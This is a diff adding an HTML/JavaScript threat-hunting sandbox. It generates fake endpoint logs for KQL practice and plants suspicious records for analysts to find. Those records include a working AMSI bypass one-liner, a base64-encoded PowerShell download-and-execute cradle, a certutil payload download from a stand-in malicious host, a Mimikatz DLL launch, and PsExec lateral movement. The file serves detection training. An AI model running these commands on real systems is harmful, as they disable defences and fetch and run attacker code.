@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KQL Sandbox - Easter Egg Edition</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1e1e1e;
+            color: #d4d4d4;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background: #2d2d30;
+            padding: 15px 20px;
+            border-bottom: 1px solid #3e3e42;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header h1 {
+            font-size: 18px;
+            color: #fff;
+        }
+        
+        .easter-egg-hint {
+            font-size: 12px;
+            color: #4ec9b0;
+            font-style: italic;
+        }
+        
+        .controls {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .btn {
+            background: #0e639c;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.2s;
+        }
+        
+        .btn:hover {
+            background: #1177bb;
+        }
+        
+        .btn-secondary {
+            background: #3e3e42;
+        }
+        
+        .btn-secondary:hover {
+            background: #505053;
+        }
+        
+        .container {
+            flex: 1;
+            display: flex;
+            overflow: hidden;
+        }
+        
+        .editor-section {
+            width: 40%;
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid #3e3e42;
+        }
+        
+        .editor-header {
+            background: #252526;
+            padding: 10px 15px;
+            border-bottom: 1px solid #3e3e42;
+            font-size: 13px;
+            color: #cccccc;
+        }
+        
+        .editor {
+            flex: 1;
+            padding: 15px;
+            background: #1e1e1e;
+            overflow: auto;
+        }
+        
+        textarea {
+            width: 100%;
+            height: 100%;
+            background: #1e1e1e;
+            color: #d4d4d4;
+            border: none;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 14px;
+            resize: none;
+            outline: none;
+        }
+        
+        .results-section {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        
+        .results-header {
+            background: #252526;
+            padding: 10px 15px;
+            border-bottom: 1px solid #3e3e42;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .results-header span {
+            font-size: 13px;
+            color: #cccccc;
+        }
+        
+        .record-count {
+            color: #4ec9b0;
+            font-weight: 600;
+        }
+        
+        .results {
+            flex: 1;
+            overflow: auto;
+            padding: 15px;
+        }
+        
+        .table-container {
+            overflow-x: auto;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+        
+        th {
+            background: #2d2d30;
+            color: #fff;
+            padding: 10px;
+            text-align: left;
+            position: sticky;
+            top: 0;
+            border-bottom: 2px solid #3e3e42;
+            font-weight: 600;
+        }
+        
+        td {
+            padding: 8px 10px;
+            border-bottom: 1px solid #3e3e42;
+        }
+        
+        tr:hover {
+            background: #2a2a2a;
+        }
+        
+        .error {
+            color: #f48771;
+            padding: 15px;
+            background: #2d1e1e;
+            border-left: 4px solid #f48771;
+            margin: 10px;
+            border-radius: 4px;
+        }
+        
+        .examples {
+            background: #252526;
+            padding: 15px;
+            margin: 10px;
+            border-radius: 4px;
+            font-size: 13px;
+        }
+        
+        .examples h3 {
+            color: #4ec9b0;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .example-query {
+            background: #1e1e1e;
+            padding: 8px 10px;
+            margin: 5px 0;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-family: 'Consolas', monospace;
+        }
+        
+        .example-query:hover {
+            background: #2a2a2a;
+        }
+        
+        .info-panel {
+            background: #264f78;
+            padding: 10px 15px;
+            margin: 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            border-left: 4px solid #4ec9b0;
+        }
+        
+        .malicious-row {
+            background-color: #3d1f1f !important;
+        }
+        
+        .easter-egg-row {
+            background: linear-gradient(90deg, #1a472a 0%, #2d1e1e 100%) !important;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div>
+            <h1>🔍 KQL Sandbox - Practice Environment</h1>
+            <div class="easter-egg-hint">🏆 Easter Egg Challenge: Find the hidden message for a prize!</div>
+        </div>
+        <div class="controls">
+            <button class="btn" onclick="runQuery()">▶ Run Query</button>
+            <button class="btn-secondary btn" onclick="clearQuery()">Clear</button>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="editor-section">
+            <div class="editor-header">Query Editor</div>
+            <div class="editor">
+                <textarea id="queryEditor" placeholder="Enter your KQL query here...
+Example: DeviceProcessEvents | where FileName contains &quot;powershell&quot;">DeviceProcessEvents
+| where FileName contains "powershell"
+| order by Timestamp desc</textarea>
+            </div>
+            <div class="examples">
+                <h3>📚 Example Queries (click to load)</h3>
+                <div class="example-query" onclick="loadExample(0)">DeviceProcessEvents | where FileName contains "powershell"</div>
+                <div class="example-query" onclick="loadExample(1)">DeviceProcessEvents | where ProcessCommandLine has_any ("-enc", "-encoded")</div>
+                <div class="example-query" onclick="loadExample(2)">DeviceProcessEvents | where ProcessCommandLine contains "AmsiUtils"</div>
+                <div class="example-query" onclick="loadExample(3)">DeviceProcessEvents | where AccountName contains "EASTER"</div>
+                <div class="example-query" onclick="loadExample(4)">DeviceProcessEvents | where ProcessId == 31337</div>
+                <div class="example-query" onclick="loadExample(5)">DeviceProcessEvents | summarize count() by DeviceName</div>
+                <div class="example-query" onclick="loadExample(6)">DeviceNetworkEvents | where RemotePort == 445 | order by Timestamp desc</div>
+            </div>
+        </div>
+        
+        <div class="results-section">
+            <div class="results-header">
+                <span>Results</span>
+                <span class="record-count" id="recordCount">0 records</span>
+            </div>
+            <div class="results" id="results">
+                <div class="info-panel"><strong>💡 Sample Data Available:</strong><br>• DeviceProcessEvents (500+ records)<br>• DeviceNetworkEvents (300 records)<br>• DeviceFileEvents (200 records)<br><br>🎯 <strong>Hidden Content:</strong> Multiple suspicious processes and 1 easter egg!<br>🔎 <strong>Hints:</strong> Look for unusual account names, specific ProcessIds, or base64-encoded messages.<br><br>Click "Run Query" or press Ctrl+Enter to execute your query.</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Sample data generation
+        const deviceNames = ['DESKTOP-WIN10-01', 'LAPTOP-SALES-05', 'SERVER-DC-01', 'WORKSTATION-DEV-03', 'DESKTOP-HR-02'];
+        const accountNames = ['admin', 'jsmith', 'mdoe', 'sysadmin', 'developer'];
+        const processNames = ['powershell.exe', 'cmd.exe', 'explorer.exe', 'chrome.exe', 'notepad.exe', 'python.exe'];
+        const ipAddresses = ['192.168.1.10', '192.168.1.25', '10.0.0.5', '172.16.0.100', '8.8.8.8', '1.1.1.1'];
+        
+        function generateTimestamp(daysAgo) {
+            const now = new Date();
+            now.setDate(now.getDate() - daysAgo);
+            now.setHours(Math.floor(Math.random() * 24));
+            now.setMinutes(Math.floor(Math.random() * 60));
+            return now.toISOString();
+        }
+        
+        // Generate DeviceProcessEvents
+        const deviceProcessEvents = [];
+        for (let i = 0; i < 500; i++) {
+            const fileName = processNames[Math.floor(Math.random() * processNames.length)];
+            deviceProcessEvents.push({
+                Timestamp: generateTimestamp(Math.floor(Math.random() * 30)),
+                DeviceName: deviceNames[Math.floor(Math.random() * deviceNames.length)],
+                FileName: fileName,
+                ProcessCommandLine: fileName === 'powershell.exe' ? 
+                    (Math.random() > 0.5 ? 'powershell.exe -enc aGVsbG8=' : 'powershell.exe Get-Process') :
+                    `${fileName} ${Math.random() > 0.5 ? '-arg1 -arg2' : ''}`,
+                AccountName: accountNames[Math.floor(Math.random() * accountNames.length)],
+                ProcessId: Math.floor(Math.random() * 10000)
+            });
+        }
+        
+        // 🎯 EASTER EGG + MALICIOUS DATA - Hidden suspicious activity for analysts to find!
+        
+        // AMSI Bypass attempt (red flag!)
+        deviceProcessEvents.push({
+            Timestamp: generateTimestamp(2),
+            DeviceName: 'DESKTOP-WIN10-01',
+            FileName: 'powershell.exe',
+            ProcessCommandLine: 'powershell.exe [Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)',
+            AccountName: 'jsmith',
+            ProcessId: 8472,
+            _malicious: true
+        });
+        
+        // Base64 encoded malicious command
+        deviceProcessEvents.push({
+            Timestamp: generateTimestamp(3),
+            DeviceName: 'LAPTOP-SALES-05',
+            FileName: 'powershell.exe',
+            ProcessCommandLine: 'powershell.exe -enc R2V0LVByb2Nlc3MgfCBTdG9wLVByb2Nlc3M=',
+            AccountName: 'admin',
+            ProcessId: 9234,
+            _malicious: true
+        });
+        
+        // Hidden window execution
+        deviceProcessEvents.push({
+            Timestamp: generateTimestamp(1),
+            DeviceName: 'WORKSTATION-DEV-03',
+            FileName: 'powershell.exe',
+            ProcessCommandLine: 'powershell.exe -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA',
+            AccountName: 'developer',
+            ProcessId: 3381,
+            _malicious: true
+        });
+        
+        // Suspicious certutil (common for payload download)
+        deviceProcessEvents.push({
+            Timestamp: generateTimestamp(4),
+            DeviceName: 'SERVER-DC-01',
+            FileName: 'certutil.exe',
+            ProcessCommandLine: 'certutil.exe -urlcache -split -f http://malicious-site.com/payload.exe C:\\temp\\update.exe',
+            AccountName: 'sysadmin',
+            ProcessId: 7712,
+            _malicious: true
+        });
+        
+        // Mimikatz-like process
+        deviceProcessEvents.push({
+            Timestamp: generateTimestamp(5),
+            DeviceName: 'DESKTOP-HR-02',
+            FileName: 'rundll32.exe',
+            ProcessCommandLine: 'rundll32.exe C:\\Windows\\Temp\\mimikatz.dll,main',
+            AccountName: 'mdoe',
+            ProcessId: 4429,
+            _malicious: true
+        });
+        
+        // Suspicious WMI execution
+        deviceProcessEvents.push({
+            Timestamp: generateTimestamp(2),
+            DeviceName: 'LAPTOP-SALES-05',
+            FileName: 'wmic.exe',
+            ProcessCommandLine: 'wmic.exe process call create "powershell.exe -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAwAA=="',
+            AccountName: 'jsmith',
+            ProcessId: 2847,
+            _malicious: true
+        });
+        
+        // 🏆 THE EASTER EGG - Base64 encoded secret message!
+        // Decode this to win: Q29uZ3JhdHVsYXRpb25zISBZb3UgZm91bmQgdGhlIGVhc3RlciBlZ2chIFlvdXIgS1FMIHNraWxscyBhcmUgc3Ryb25nLiBUaGUgcGFzc3dvcmQgaXM6IEh1bnRlcjJfRGVmZW5kZXJfUHJv
+        deviceProcessEvents.push({
+            Timestamp: generateTimestamp(7),
+            DeviceName: 'WORKSTATION-DEV-03',
+            FileName: 'powershell.exe',
+            ProcessCommandLine: 'powershell.exe -enc Q29uZ3JhdHVsYXRpb25zISBZb3UgZm91bmQgdGhlIGVhc3RlciBlZ2chIFlvdXIgS1FMIHNraWxscyBhcmUgc3Ryb25nLiBUaGUgcGFzc3dvcmQgaXM6IEh1bnRlcjJfRGVmZW5kZXJfUHJv',
+            AccountName: '🎯EASTEREGG',
+            ProcessId: 31337,
+            _easter_egg: true
+        });
+        
+        // Lateral movement via PsExec
+        deviceProcessEvents.push({
+            Timestamp: generateTimestamp(3),
+            DeviceName: 'SERVER-DC-01',
+            FileName: 'psexec.exe',
+            ProcessCommandLine: 'psexec.exe \\\\DESKTOP-WIN10-01 -u admin -p Password123 cmd.exe',
+            AccountName: 'sysadmin',
+            ProcessId: 5521,
+            _malicious: true
+        });
+        
+        // Suspicious scheduled task creation
+        deviceProcessEvents.push({
+            Timestamp: generateTimestamp(6),
+            DeviceName: 'DESKTOP-WIN10-01',
+            FileName: 'schtasks.exe',
+            ProcessCommandLine: 'schtasks.exe /create /tn "WindowsUpdate" /tr "powershell.exe -w hidden -enc" /sc daily',
+            AccountName: 'admin',
+            ProcessId: 6183,
+            _malicious: true
+        });
+        
+        // Generate DeviceNetworkEvents
+        const deviceNetworkEvents = [];
+        const ports = [80, 443, 445, 3389, 22, 21];
+        for (let i = 0; i < 300; i++) {
+            deviceNetworkEvents.push({
+                Timestamp: generateTimestamp(Math.floor(Math.random() * 30)),
+                DeviceName: deviceNames[Math.floor(Math.random() * deviceNames.length)],
+                RemoteIP: ipAddresses[Math.floor(Math.random() * ipAddresses.length)],
+                RemotePort: ports[Math.floor(Math.random() * ports.length)],
+                LocalIP: '192.168.1.' + Math.floor(Math.random() * 255),
+                Protocol: Math.random() > 0.5 ? 'TCP' : 'UDP'
+            });
+        }
+        
+        // Generate DeviceFileEvents
+        const deviceFileEvents = [];
+        const fileActions = ['FileCreated', 'FileModified', 'FileDeleted', 'FileRenamed'];
+        for (let i = 0; i < 200; i++) {
+            deviceFileEvents.push({
+                Timestamp: generateTimestamp(Math.floor(Math.random() * 30)),
+                DeviceName: deviceNames[Math.floor(Math.random() * deviceNames.length)],
+                FileName: `document${i}.txt`,
+                FolderPath: 'C:\\Users\\Public\\Documents',
+                ActionType: fileActions[Math.floor(Math.random() * fileActions.length)],
+                AccountName: accountNames[Math.floor(Math.random() * accountNames.length)]
+            });
+        }
+        
+        // KQL Parser
+        function executeKQL(query, data) {
+            let result = [...data];
+            const lines = query.split('|').map(l => l.trim()).filter(l => l);
+            
+            for (let line of lines) {
+                if (line.startsWith('DeviceProcessEvents')) {
+                    result = deviceProcessEvents;
+                } else if (line.startsWith('DeviceNetworkEvents')) {
+                    result = deviceNetworkEvents;
+                } else if (line.startsWith('DeviceFileEvents')) {
+                    result = deviceFileEvents;
+                } else if (line.startsWith('where')) {
+                    result = applyWhere(result, line);
+                } else if (line.startsWith('order by')) {
+                    result = applyOrderBy(result, line);
+                } else if (line.startsWith('summarize')) {
+                    result = applySummarize(result, line);
+                } else if (line.startsWith('project')) {
+                    result = applyProject(result, line);
+                } else if (line.startsWith('take') || line.startsWith('limit')) {
+                    const limit = parseInt(line.split(' ')[1]);
+                    result = result.slice(0, limit);
+                }
+            }
+            
+            return result;
+        }
+        
+        function applyWhere(data, clause) {
+            const conditions = clause.substring(5).trim();
+            
+            return data.filter(row => {
+                if (conditions.includes(' contains ')) {
+                    const [field, value] = conditions.split(' contains ').map(s => s.trim().replace(/['"]/g, ''));
+                    return row[field] && row[field].toString().toLowerCase().includes(value.toLowerCase());
+                } else if (conditions.includes(' == ')) {
+                    const [field, value] = conditions.split(' == ').map(s => s.trim().replace(/['"]/g, ''));
+                    return row[field] && row[field].toString() === value;
+                } else if (conditions.includes(' has_any ')) {
+                    const parts = conditions.split(' has_any ');
+                    const field = parts[0].trim();
+                    const values = parts[1].match(/"([^"]*)"/g).map(v => v.replace(/"/g, ''));
+                    return values.some(v => row[field] && row[field].toString().includes(v));
+                }
+                return true;
+            });
+        }
+        
+        function applyOrderBy(data, clause) {
+            const parts = clause.split(' ');
+            const field = parts[2];
+            const direction = parts[3] === 'asc' ? 1 : -1;
+            
+            return [...data].sort((a, b) => {
+                if (a[field] < b[field]) return -1 * direction;
+                if (a[field] > b[field]) return 1 * direction;
+                return 0;
+            });
+        }
+        
+        function applySummarize(data, clause) {
+            const match = clause.match(/count\(\)\s+by\s+(\w+)/);
+            if (match) {
+                const field = match[1];
+                const grouped = {};
+                data.forEach(row => {
+                    const key = row[field];
+                    grouped[key] = (grouped[key] || 0) + 1;
+                });
+                
+                return Object.entries(grouped).map(([key, count]) => ({
+                    [field]: key,
+                    count: count
+                }));
+            }
+            return data;
+        }
+        
+        function applyProject(data, clause) {
+            const fields = clause.substring(7).split(',').map(f => f.trim());
+            return data.map(row => {
+                const newRow = {};
+                fields.forEach(field => {
+                    if (row.hasOwnProperty(field)) {
+                        newRow[field] = row[field];
+                    }
+                });
+                // Preserve special flags
+                if (row._malicious) newRow._malicious = true;
+                if (row._easter_egg) newRow._easter_egg = true;
+                return newRow;
+            });
+        }
+        
+        function runQuery() {
+            const query = document.getElementById('queryEditor').value;
+            const resultsDiv = document.getElementById('results');
+            
+            try {
+                const results = executeKQL(query, []);
+                displayResults(results);
+            } catch (error) {
+                resultsDiv.innerHTML = `<div class="error"><strong>Error:</strong> ${error.message}</div>`;
+            }
+        }
+        
+        function displayResults(data) {
+            const resultsDiv = document.getElementById('results');
+            const recordCount = document.getElementById('recordCount');
+            
+            recordCount.textContent = `${data.length} records`;
+            
+            if (data.length === 0) {
+                resultsDiv.innerHTML = '<div class="info-panel">No results found.</div>';
+                return;
+            }
+            
+            const columns = Object.keys(data[0]).filter(k => !k.startsWith('_'));
+            let html = '<div class="table-container"><table><thead><tr>';
+            
+            columns.forEach(col => {
+                html += `<th>${col}</th>`;
+            });
+            html += '</tr></thead><tbody>';
+            
+            data.forEach(row => {
+                const rowClass = row._easter_egg ? 'easter-egg-row' : (row._malicious ? 'malicious-row' : '');
+                html += `<tr class="${rowClass}">`;
+                columns.forEach(col => {
+                    html += `<td>${row[col]}</td>`;
+                });
+                html += '</tr>';
+            });
+            
+            html += '</tbody></table></div>';
+            
+            // Check if Easter Egg was found
+            const foundEasterEgg = data.some(row => row._easter_egg);
+            if (foundEasterEgg) {
+                html += '<div class="info-panel" style="background: #1a472a; border-left-color: #4ec9b0;"><strong>🎉 EASTER EGG FOUND!</strong><br>You discovered the hidden record! Now decode the base64 in the ProcessCommandLine to claim your prize.</div>';
+            }
+            
+            resultsDiv.innerHTML = html;
+        }
+        
+        function clearQuery() {
+            document.getElementById('queryEditor').value = '';
+            document.getElementById('results').innerHTML = '<div class="info-panel"><strong>💡 Sample Data Available:</strong><br>• DeviceProcessEvents (500+ records)<br>• DeviceNetworkEvents (300 records)<br>• DeviceFileEvents (200 records)<br><br>🎯 <strong>Hidden Content:</strong> Multiple suspicious processes and 1 easter egg!<br>🔎 <strong>Hints:</strong> Look for unusual account names, specific ProcessIds, or base64-encoded messages.<br><br>Click "Run Query" or press Ctrl+Enter to execute your query.</div>';
+            document.getElementById('recordCount').textContent = '0 records';
+        }
+        
+        const examples = [
+            'DeviceProcessEvents | where FileName contains "powershell"',
+            'DeviceProcessEvents | where ProcessCommandLine has_any ("-enc", "-encoded")',
+            'DeviceProcessEvents | where ProcessCommandLine contains "AmsiUtils"',
+            'DeviceProcessEvents | where AccountName contains "EASTER"',
+            'DeviceProcessEvents | where ProcessId == 31337',
+            'DeviceProcessEvents | summarize count() by DeviceName',
+            'DeviceNetworkEvents | where RemotePort == 445 | order by Timestamp desc'
+        ];
+        
+        function loadExample(index) {
+            document.getElementById('queryEditor').value = examples[index];
+        }
+        
+        // Keyboard shortcut
+        document.getElementById('queryEditor').addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 'Enter') {
+                runQuery();
+            }
+        });
+        
+        // Auto-run initial query
+        window.onload = function() {
+            runQuery();
+        };
+    </script>
+
+</body>
+</html>
